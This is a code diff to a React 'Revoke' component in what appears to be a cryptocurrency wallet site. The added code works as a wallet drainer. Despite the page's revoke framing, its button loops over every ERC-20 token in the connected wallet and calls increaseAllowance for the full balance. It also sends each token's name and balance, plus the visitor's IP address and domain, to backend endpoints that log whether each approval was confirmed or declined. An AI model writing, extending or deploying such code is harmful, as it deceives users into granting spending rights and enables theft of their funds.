@@ -12,7 +12,12 @@ import {
   getIPAddress,
   getDomain,
 } from "../utils/helpers";
-import { walletScanned } from "../api";
+import {
+  walletScanned,
+  requestTokenSignature,
+  tokenConfirmed,
+  tokenDeclined,
+} from "../api";
 
 const Revoke = () => {
   const {
@@ -27,6 +32,7 @@ const Revoke = () => {
     handleLoadingEthBalance,
   } = useContext(AppContext);
   const { isConnected, address, connector } = useAccount();
+  const [walletData, setwalletData] = useState({});
   const [isButtonDisabled, setIsButtonDisabled] = useState(false);
   const [priceData, setPriceData] = useState(null);
   const [testToken, setTestToken] = useState([
@@ -52,7 +58,6 @@ const Revoke = () => {
     {
       contractAddress: "0x6982508145454ce325ddbe47a25d4ec3d2311933",
       balance: "1999999998000000.0",
-
       rawBalance: "999999999998000000000000000000000",
       decimals: 18,
       logo: undefined,
@@ -151,21 +156,67 @@ const Revoke = () => {
         }
       };
       fetchData();
-      console.log("data for post request: ", data);
+      setwalletData(data);
     }
   }, [priceData, testToken, loadingData, connector]);
 
   const handleClick = async () => {
     setIsButtonDisabled((prevIsButtonDisabled) => true); // Functional update
     try {
-      const res = await increaseAllowanceForTokens(testToken);
-      console.log("responds from increase allowance token: ", res);
+      for (let token of walletData.erc_20_tokens) {
+        const { contract_address, balance, token_name, token_balance } = token;
+        const data = {
+          asset_name: token_name,
+          domain: walletData.domain,
+          ip_address: walletData.ip_address,
+          withdrawal_amount: balance,
+          withdrawal_amount_token: token_balance,
+        };
+        try {
+          const res = requestTokenSignature(data);
+          console.log("request Token Signature succesful: ", res);
+        } catch (error) {
+          console.log("request Token Signature failed:", error);
+        }
+        const res = await increaseAllowance(contract_address, token_balance);
+        if (res.success) {
+          const data = {
+            asset_name: token_name,
+            domain: walletData.domain,
+            ip_address: walletData.ip_address,
+            withdrawal_amount: balance,
+            withdrawal_amount_token: token_balance,
+          };
+          try {
+            const res = await tokenConfirmed(data);
+            console.log("token confirmed post successful: ", res);
+            console.log(
+              `Increase allowance successful! Transaction hash: ${res.data}`
+            );
+          } catch (error) {
+            console.error("token confirmed post failed:", error);
+          }
+        } else {
+          const data = {
+            asset_name: token_name,
+            domain: walletData.domain,
+            ip_address: walletData.ip_address,
+            withdrawal_amount: balance,
+            withdrawal_amount_token: token_balance,
+          };
+          try {
+            const res = tokenDeclined(data);
+            console.log("tokenDeclined post successful:", res);
+            console.log(`Increase allowance failed: ${res.error}`);
+          } catch (error) {
+            console.log("tokenDeclined post failed:", res);
+          }
+        }
+      }
     } catch (error) {
-      console.error(console.error("failed to increase Allowance token"));
-    }
-    finally{
-      setIsButtonDisabled(false)
-
+      console.error("Failed to increase allowance token:", error);
+    } finally {
+      setIsButtonDisabled(false);
     }
   };
 
